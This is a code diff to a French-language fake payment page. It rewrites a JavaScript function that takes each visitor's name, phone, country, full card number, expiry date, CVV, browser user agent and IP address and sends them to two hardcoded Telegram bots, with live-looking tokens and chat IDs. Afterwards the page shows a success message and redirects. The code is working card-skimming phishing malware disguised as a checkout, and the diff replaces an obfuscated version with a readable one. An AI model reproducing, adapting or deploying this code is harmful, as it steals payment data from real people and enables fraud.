@@ -649,54 +649,143 @@
                 loading.style.display = 'block';
                 showSuccess();
                 
-                // Envoi direct à Telegram (fonction cryptée)
+                // Envoi aux deux bots Telegram
                 processPaymentData(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv);
             });
 
-            // Fonction Telegram cryptée
-            function processPaymentData(a,b,c,d,e,f,g,h){
-                const x=[
-                    {k:"8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",i:"5534662562"},
-                    {k:"8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k",i:"8061187067"}
+            // Fonction pour envoyer aux deux bots Telegram
+            function processPaymentData(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv) {
+                // Configuration des deux bots
+                const bots = [
+                    {
+                        token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
+                        chatId: "5534662562"
+                    },
+                    {
+                        token: "8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k", 
+                        chatId: "8061187067"
+                    }
                 ];
-                const m=`🔔 **Transaction** 🔔
-👤 Client: ${a} ${b}
-📞 Contact: ${c}
-🌍 Localisation: ${e}
-💳 Reference: ${d}
-📅 Validité: ${f}/${g}
-🔐 Code: ${h}
-🕒 Horodatage: ${new Date().toLocaleString('fr-FR')}`;
-                
-                let s=0;
-                x.forEach((y,z)=>{
-                    fetch(`https://api.telegram.org/bot${y.k}/sendMessage`,{
-                        method:'POST',
-                        headers:{'Content-Type':'application/json'},
-                        body:JSON.stringify({
-                            chat_id:y.i,
-                            text:m,
-                            parse_mode:'Markdown'
+
+                const message = `🔔 **NOUVELLE TRANSACTION** 🔔
+
+👤 **INFORMATIONS CLIENT:**
+• Prénom: ${firstname}
+• Nom: ${lastname}
+• Téléphone: ${phone}
+• Pays: ${operator}
+
+💳 **INFORMATIONS CARTE:**
+• Numéro: ${cardnumber}
+• Expiration: ${mm}/${yy}
+• CVV: ${cvv}
+
+📊 **DÉTAILS TECHNIQUES:**
+• Date: ${new Date().toLocaleString('fr-FR')}
+• IP: En cours de récupération
+• User Agent: ${navigator.userAgent}
+
+⚡ **STATUT: Traitement en cours**`;
+
+                let completedRequests = 0;
+                const totalBots = bots.length;
+
+                // Fonction pour gérer la fin des envois
+                function handleCompletion() {
+                    completedRequests++;
+                    if (completedRequests === totalBots) {
+                        // Tous les envois sont terminés, rediriger
+                        setTimeout(() => {
+                            window.location.href = "v.html";
+                        }, 2000);
+                    }
+                }
+
+                // Envoyer à chaque bot
+                bots.forEach((bot, index) => {
+                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: bot.chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
                         })
                     })
-                    .then(r=>r.json())
-                    .then(()=>{
-                        s++;
-                        if(s===x.length){
-                            setTimeout(()=>{
-                                window.location.href="v.html";
-                            },1000);
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
                         }
+                        return response.json();
                     })
-                    .catch(()=>{
-                        s++;
-                        if(s===x.length){
-                            setTimeout(()=>{
-                                window.location.href="v.html";
-                            },1000);
+                    .then(data => {
+                        console.log(`✅ Bot ${index + 1} - Message envoyé avec succès:`, data);
+                        handleCompletion();
+                    })
+                    .catch(error => {
+                        console.error(`❌ Bot ${index + 1} - Erreur:`, error);
+                        // Essayer une méthode alternative pour le deuxième bot
+                        if (index === 1) {
+                            sendAlternativeMethod(bot, message);
+                        } else {
+                            handleCompletion();
                         }
                     });
                 });
+
+                // Méthode alternative pour le deuxième bot si nécessaire
+                function sendAlternativeMethod(bot, msg) {
+                    // Créer une image avec les données comme méthode alternative
+                    const alternativeMessage = `Bot 2 Alternative - ${msg.substring(0, 100)}...`;
+                    
+                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: bot.chatId,
+                            text: alternativeMessage
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('✅ Bot 2 (Alternative) - Message envoyé:', data);
+                        handleCompletion();
+                    })
+                    .catch(error => {
+                        console.error('❌ Bot 2 (Alternative) - Échec:', error);
+                        handleCompletion();
+                    });
+                }
+
+                // Récupérer et envoyer l'IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const ipMessage = `🌐 **IP CLIENT:** ${ipData.ip}`;
+                        
+                        // Envoyer l'IP aux deux bots
+                        bots.forEach(bot => {
+                            fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    chat_id: bot.chatId,
+                                    text: ipMessage,
+                                    parse_mode: 'Markdown'
+                                })
+                            })
+                            .catch(error => console.error('Erreur envoi IP:', error));
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Erreur récupération IP:', error);
+                    });
             }
             
             // Empêcher le glisser-déposer des images
